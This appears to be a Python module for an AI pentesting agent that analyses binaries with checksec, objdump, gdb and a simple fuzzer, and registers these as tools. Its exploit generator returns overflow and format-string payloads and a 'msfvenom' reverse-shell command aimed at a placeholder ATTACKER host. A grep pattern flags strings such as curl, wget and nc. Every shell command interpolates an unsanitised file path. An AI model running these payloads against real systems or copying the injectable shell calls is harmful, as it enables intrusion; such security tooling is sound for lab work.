"""Binary Exploitation Range Agent - Real binary analysis using checksec, pwntools."""

import asyncio
import re
from dataclasses import dataclass
from enum import Enum
from typing import Any, Optional

from ai.tool_registry import ToolCategory, register_tool, ToolParameter


class BinaryType(str, Enum):
    """Types of binaries."""

    ELF32 = "elf32"
    ELF64 = "elf64"
    PE32 = "pe32"
    PE64 = "pe64"
    UNKNOWN = "unknown"


class VulnType(str, Enum):
    """Types of binary vulnerabilities."""

    BUFFER_OVERFLOW = "buffer_overflow"
    HEAP_OVERFLOW = "heap_overflow"
    USE_AFTER_FREE = "use_after_free"
    FORMAT_STRING = "format_string"
    INTEGER_OVERFLOW = "integer_overflow"
    RACE_CONDITION = "race_condition"
    STACK_SMASHING = "stack_smashing"


@dataclass
class BinaryInfo:
    """Information about a binary."""

    path: str
    binary_type: BinaryType
    arch: Optional[str] = None
    endian: Optional[str] = None
    stripped: bool = False
    nx: bool = False  # No-execute
    aslr: bool = False
    canary: bool = False
    relro: Optional[str] = None  # none, partial, full
    rpath: Optional[str] = None
    symbols: list[str] = None
    strings: list[str] = None


@dataclass
class BinaryVulnerability:
    """A discovered binary vulnerability."""

    binary: str
    vulnerability_type: VulnType
    offset: Optional[int] = None
    buffer_size: Optional[int] = None
    evidence: Optional[str] = None
    exploitable: bool = False


class BinaryAgent:
    """Binary exploitation analysis agent using real tools."""

    def __init__(self):
        self._binaries: list[BinaryInfo] = []
        self._vulnerabilities: list[BinaryVulnerability] = []

    async def analyze_binary(self, path: str) -> dict:
        """Analyze a binary file using file, readelf, strings."""
        results = {
            "path": path,
            "type": "unknown",
            "arch": "unknown",
            "endian": "unknown",
            "stripped": False,
            "security": {},
            "functions": [],
            "strings": [],
            "interesting_strings": [],
        }

        # Get file type
        try:
            cmd = f"file {path}"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            file_output = stdout.decode("utf-8", errors="replace")
            results["file_info"] = file_output.strip()

            if "ELF 64-bit" in file_output:
                results["type"] = "elf64"
                results["arch"] = "x86_64"
            elif "ELF 32-bit" in file_output:
                results["type"] = "elf32"
                results["arch"] = "x86"
            elif "PE32" in file_output:
                results["type"] = "pe32"
            elif "PE32+" in file_output:
                results["type"] = "pe64"

            if "not stripped" in file_output:
                results["stripped"] = False
            elif "stripped" in file_output:
                results["stripped"] = True

        except Exception as e:
            results["error"] = f"file command failed: {str(e)}"

        # Get security features using checksec
        security = await self.check_security(path)
        results["security"] = security

        # Get interesting strings
        try:
            cmd = f"strings {path} | grep -iE '(password|secret|key|admin|root|flag|curl|wget|nc|bash|sh|exec|system|strcpy|gets|scanf|printf|%x|%n)'"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            interesting = stdout.decode("utf-8", errors="replace").strip().split("\n")
            results["interesting_strings"] = [s for s in interesting if s][:50]
        except Exception:
            pass

        # Get symbols if not stripped
        if not results["stripped"]:
            try:
                cmd = f"nm {path} 2>/dev/null | grep -iE '(main|vuln|flag|win|lose|admin|root)'"
                proc = await asyncio.create_subprocess_shell(
                    cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                symbols = stdout.decode("utf-8", errors="replace").strip().split("\n")
                results["functions"] = [s for s in symbols if s][:50]
            except Exception:
                pass

        return results

    async def check_security(self, path: str) -> dict:
        """Check binary security features using checksec."""
        results = {
            "nx": False,
            "aslr": False,
            "canary": False,
            "relro": "none",
            "pie": False,
            "rpath": None,
            "fortify": False,
        }

        try:
            cmd = f"checksec --file={path} 2>/dev/null || checksec {path} 2>/dev/null"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            output = stdout.decode("utf-8", errors="replace")

            # Parse checksec output
            if "NX enabled" in output or "NX:.*Yes" in output:
                results["nx"] = True
            if "ASLR enabled" in output or "ASLR:.*Yes" in output:
                results["aslr"] = True
            if "Canary found" in output or "Stack Canary:.*Yes" in output:
                results["canary"] = True
            if "Full RELRO" in output:
                results["relro"] = "full"
            elif "Partial RELRO" in output:
                results["relro"] = "partial"
            if "PIE enabled" in output or "PIE:.*Yes" in output:
                results["pie"] = True
            if "RPATH" in output:
                results["rpath"] = True
            if "Fortify Source" in output:
                results["fortify"] = True

        except Exception:
            # Fallback: manual check using readelf
            try:
                cmd = f"readelf -l {path} 2>/dev/null | grep GNU_STACK"
                proc = await asyncio.create_subprocess_shell(
                    cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                output = stdout.decode("utf-8", errors="replace")
                if "RWE" not in output:
                    results["nx"] = True
            except Exception:
                pass

        return results

    async def find_vulnerabilities(self, path: str) -> dict:
        """Find potential vulnerabilities in binary."""
        results = {
            "vulnerabilities": [],
            "dangerous_functions": [],
            "input_points": [],
            "recommendations": [],
        }

        # Check for dangerous functions
        try:
            cmd = f"nm {path} 2>/dev/null || objdump -T {path} 2>/dev/null"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            output = stdout.decode("utf-8", errors="replace")

            dangerous = ["gets", "strcpy", "strcat", "sprintf", "scanf", "printf", "system", "exec"]
            for func in dangerous:
                if func in output.lower():
                    results["dangerous_functions"].append(func)
                    results["vulnerabilities"].append({
                        "type": "dangerous_function",
                        "function": func,
                        "risk": "high" if func in ["gets", "strcpy", "system"] else "medium",
                    })
        except Exception:
            pass

        # Check for format string vulnerabilities
        try:
            cmd = f"strings {path} | grep -E '%[0-9]*[xXdiouxXeEfFgGaAcspn]'"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            output = stdout.decode("utf-8", errors="replace").strip()
            if output:
                results["vulnerabilities"].append({
                    "type": "format_string",
                    "evidence": output[:200],
                    "risk": "high",
                })
        except Exception:
            pass

        return results

    async def static_analysis(self, path: str) -> dict:
        """Perform static analysis using objdump/readelf."""
        results = {
            "functions": [],
            "strings": [],
            "imports": [],
            "exports": [],
        }

        try:
            # Get imports
            cmd = f"objdump -T {path} 2>/dev/null | grep '*UND*'"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            imports = stdout.decode("utf-8", errors="replace").strip().split("\n")
            results["imports"] = [i.strip() for i in imports if i.strip()][:50]
        except Exception:
            pass

        try:
            # Get exports
            cmd = f"objdump -T {path} 2>/dev/null | grep -v '*UND*'"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            exports = stdout.decode("utf-8", errors="replace").strip().split("\n")
            results["exports"] = [e.strip() for e in exports if e.strip()][:50]
        except Exception:
            pass

        return results

    async def dynamic_analysis(self, path: str, input_file: Optional[str] = None) -> dict:
        """Perform dynamic analysis with GDB."""
        results = {
            "execution_flow": [],
            "memory_access": [],
            "crashes": [],
        }

        # Generate GDB script
        gdb_script = f"""
set pagination off
b main
r
info functions
info registers
continue
quit
"""
        try:
            cmd = f"echo '{gdb_script}' | timeout 10 gdb -batch -x /dev/stdin {path} 2>/dev/null"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
            output = stdout.decode("utf-8", errors="replace")
            results["gdb_output"] = output[:2000]
        except Exception:
            pass

        return results

    async def fuzz_target(self, path: str, iterations: int = 1000) -> dict:
        """Fuzz a binary target with basic patterns."""
        results = {
            "crashes": [],
            "unique_crashes": 0,
            "coverage": 0.0,
            "patterns_tested": 0,
        }

        # Generate fuzzing patterns
        patterns = [
            "A" * 100,
            "A" * 1000,
            "A" * 10000,
            "%x" * 50,
            "%s" * 50,
            "\x00" * 100,
        ]

        for pattern in patterns[:iterations]:
            try:
                cmd = f"echo '{pattern}' | timeout 2 {path} 2>/dev/null"
                proc = await asyncio.create_subprocess_shell(
                    cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=3)

                # Check for crash signals
                if proc.returncode and proc.returncode < 0:
                    signal = -proc.returncode
                    if signal in [6, 11]:  # SIGABRT, SIGSEGV
                        results["crashes"].append({
                            "pattern": pattern[:50],
                            "signal": signal,
                            "type": "SIGSEGV" if signal == 11 else "SIGABRT",
                        })
                        results["unique_crashes"] += 1

                results["patterns_tested"] += 1
            except Exception:
                continue

        return results

    def generate_exploit(self, vulnerability: BinaryVulnerability) -> dict:
        """Generate exploit payload for a vulnerability."""
        if vulnerability.vulnerability_type == VulnType.BUFFER_OVERFLOW:
            return self._generate_buffer_overflow_exploit(vulnerability)
        elif vulnerability.vulnerability_type == VulnType.FORMAT_STRING:
            return self._generate_format_string_exploit(vulnerability)
        else:
            return {"error": "Exploit generation not implemented for this type"}

    def _generate_buffer_overflow_exploit(self, vuln: BinaryVulnerability) -> dict:
        """Generate buffer overflow exploit using pwntools patterns."""
        offset = vuln.offset or 64

        # Generate payload with pattern
        payload = "A" * offset

        # If we have offsets, create proper payload
        if offset:
            # Generate msfvenom pattern
            return {
                "type": "buffer_overflow",
                "offset": offset,
                "payload": payload,
                "payload_size": len(payload),
                "next_steps": [
                    f"Find exact offset with: msf-pattern_create -l {offset}",
                    "Find EIP offset with: msf-pattern_offset -l 4",
                    "Generate shellcode: msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER LPORT=4444",
                    f"Final payload: 'A' * offset + struct.pack('<I', eip_addr) + nop_sled + shellcode",
                ],
            }
        return {
            "type": "buffer_overflow",
            "payload": payload,
            "payload_size": len(payload),
        }

    def _generate_format_string_exploit(self, vuln: BinaryVulnerability) -> dict:
        """Generate format string exploit."""
        return {
            "type": "format_string",
            "payload": "%x.%x.%x.%x.%x.%x.%x.%x",
            "next_steps": [
                "Find offset: AAAA%p.%p.%p.%p.%p.%p.%p.%p",
                "Read value: <offset>$x",
                "Write value: <offset>$n",
            ],
        }


# Register Binary tools
@register_tool(
    name="binary_analyze",
    description="Analyze a binary file for type, architecture, and interesting strings",
    category=ToolCategory.BINARY,
    parameters=[
        ToolParameter(name="path", type="str", description="Path to binary file"),
    ],
)
async def binary_analyze(path: str) -> dict:
    """Execute binary analysis."""
    agent = BinaryAgent()
    return await agent.analyze_binary(path)


@register_tool(
    name="binary_checksec",
    description="Check binary security features (NX, ASLR, Canary, PIE, RELRO)",
    category=ToolCategory.BINARY,
    parameters=[
        ToolParameter(name="path", type="str", description="Path to binary file"),
    ],
)
async def binary_checksec(path: str) -> dict:
    """Execute security check."""
    agent = BinaryAgent()
    return await agent.check_security(path)


@register_tool(
    name="binary_vulns",
    description="Find potential vulnerabilities in binary (dangerous functions, format strings)",
    category=ToolCategory.BINARY,
    parameters=[
        ToolParameter(name="path", type="str", description="Path to binary file"),
    ],
)
async def binary_vulns(path: str) -> dict:
    """Find vulnerabilities."""
    agent = BinaryAgent()
    return await agent.find_vulnerabilities(path)


@register_tool(
    name="binary_fuzz",
    description="Fuzz a binary target with basic patterns",
    category=ToolCategory.BINARY,
    parameters=[
        ToolParameter(name="path", type="str", description="Path to binary file"),
        ToolParameter(name="iterations", type="int", description="Number of iterations", required=False, default=1000),
    ],
)
async def binary_fuzz(path: str, iterations: int = 1000) -> dict:
    """Execute fuzzing."""
    agent = BinaryAgent()
    return await agent.fuzz_target(path, iterations)
